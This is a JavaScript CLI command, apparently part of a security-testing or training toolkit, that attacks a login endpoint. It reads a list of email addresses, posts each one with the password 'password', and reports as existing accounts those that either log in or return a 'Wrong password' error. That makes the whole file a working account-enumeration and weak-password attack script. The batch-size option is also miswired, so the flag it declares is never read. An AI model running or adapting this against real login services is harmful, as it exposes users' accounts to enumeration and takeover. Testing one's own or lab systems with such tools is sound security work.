const axios = require('axios');
const fs = require('fs');
const ProgressBar = require('progress');

const Command = require('./command');

class EmailDictionary extends Command {
  constructor() {
    super(
      'email-dict',
      'Accepts a file with email addresses and checks for DELIVER accounts.',
      [
        [ '<file>', 'The file with email addresses']
      ],
      [
        [ '-h', '--host <host>', 'The hostname for the API endpoint. Default is localhost.'],
        [ '-p', '--port <port>', 'The port for the API endpoint. Default is 3333.'],
        [ '-s', '--https', 'Use https for the connection.'],
        [ '-b', '--batch <size>', 'The batch size to use. Default is 10.']
      ]
    );
  }

  async action(file, options) {
    const host = options.host ? options.host : 'localhost';
    const port = options.port ? options.port : '3333';
    const protocol = options.https ? 'https' : 'http'
    const url = `${protocol}://${host}:${port}/auth/login`;

    console.log(`Attacking ${url}`);

    const emails = fs.readFileSync(file, 'utf-8').split('\n');
    
    const batchSize = options.batchSize ? options.batchSize : 10;
    const batches = [];
    
    for (let i = 0; i < emails.length; i += batchSize) {
      batches.push(emails.slice(i, i + batchSize));
    }

    console.log(`Dictionary has ${emails.length} email addresses`);
    console.log(`Trying ${batches.length} batches of ${batchSize} emails`);

    const start = new Date();

    const bar = new ProgressBar('[:bar] :percent :etas', {
      complete: '=',
      incomplete: ' ',
      width: 50,
      total: batches.length
    });

    const accounts = [];
    for (const batch of batches) {
      
      await Promise.all(batch.map(async (email) => {
        try {
          return axios.post(
            url, 
            { email, password: 'password' }, 
            { validateStatus: () => true }
            ).then((res) => {
              if (res.status == 200)
                accounts.push(email);
              else if (res.status == 401 && res.data.message == 'Wrong password')
                accounts.push(email);
            });
        } catch (err) {
          console.log(err);
        }
      }));
      
      bar.tick();
    }
    
    console.log(`\nDuration: ${(new Date() - start) / 1000} secs`);
    console.log(`Found ${accounts.length} accounts\n`);
    if (accounts.length > 0) 
      accounts.forEach(email => console.log(email));
  }
}

module.exports = EmailDictionary;